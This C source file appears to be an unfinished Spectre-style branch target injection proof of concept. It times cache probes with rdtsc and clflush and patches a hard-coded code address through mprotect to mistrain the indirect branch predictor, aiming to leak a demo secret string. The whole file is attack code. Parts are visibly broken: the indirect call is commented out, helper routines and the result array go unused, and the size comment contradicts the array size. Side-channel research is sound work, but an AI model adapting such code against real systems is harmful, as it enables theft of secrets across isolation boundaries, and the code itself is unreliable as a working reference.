#include <stdio.h>
#include <stdlib.h>
#include <x86intrin.h>
#include <stdint.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/types.h>

const char secret[] = "Answer to the Ultimate Question of Life, The Universe, and Everything is 42";
__attribute__((section(".rodata.transmit"), aligned(0x10000))) const char probe[0x100000] = {'x'};       //64Kb


__attribute__((constructor)) void init() {
    int i;
    for (i = 0; i < sizeof(probe)/0x1000; i++)
        *(volatile char *) &probe[i*0x1000];
}

int probetime(void *adrs) {
    volatile unsigned long time;
    asm __volatile__ (
                    " mfence\n"
                    " lfence\n"
                    " rdtsc\n"
                    " lfence\n"
                    " movl %%eax, %%esi \n"
                    " movl (%1), %%eax\n"
                    " lfence\n"
                    " rdtsc\n"
                    " subl %%esi, %%eax \n"
                    " clflush 0(%1)\n"
                    : "=a" (time)
                    : "c" (adrs)
                    : "%esi", "%edx");
                    return time;
}


 __asm__(
        ".text\n.global indirectcall\nindirectcall:\n"
        "clflush (%rdi)\n"
//        "callq *(%rdi)\n"
        "retq\n"
    );

__asm__(".text\n.global touch_and_break\ntouch_and_break:\n"   
        "xorl %eax, %eax\n"
        "movb (%esi), %al\n"
        "shl $0xc, %eax\n"
        "addl %edx, %eax\n"
        "movb (%eax), %al\n"
        "retq\n");


void do_nothing(uint8_t* a, uint8_t* b){}

unsigned long train = 0x40060b;

void bti(void* offset){
    int result[256];
    int i, j, trial;
    char origin = *(char*)train;			    
    void (*target_proc)(uint8_t*, uint8_t*) = NULL;
    void *call_destination = (void*)&target_proc;

    for(i = 0; i < 256; i++)
        result[i] = 0;

    for(trial = 0; trial < 10; trial++){
        for (i = 0; i < 256; i++)
            _mm_clflush(&probe[i * 0x1000]);

        for(j = 0; j < 100; j++){
            if(j < 99){
                *(char*)(train) = 0xc3;
                target_proc = train;
            }
            else{
                *(char*)(train) = origin;
                target_proc = train;
            }
            indirectcall(call_destination, offset, probe);
	    printf("access function time %d\n", probetime(call_destination));
	}
	pause();
        printf("access time %d\n", probetime(&probe['A' * 0x1000]));
    }
}

int main(){
    unsigned long p = train;
    p &= ~0xfff;
    if(mprotect((void*)p, 0x1000, PROT_WRITE | PROT_READ | PROT_EXEC) == 0)         //修改读写权限
       bti(secret);
    exit(EXIT_SUCCESS);
}
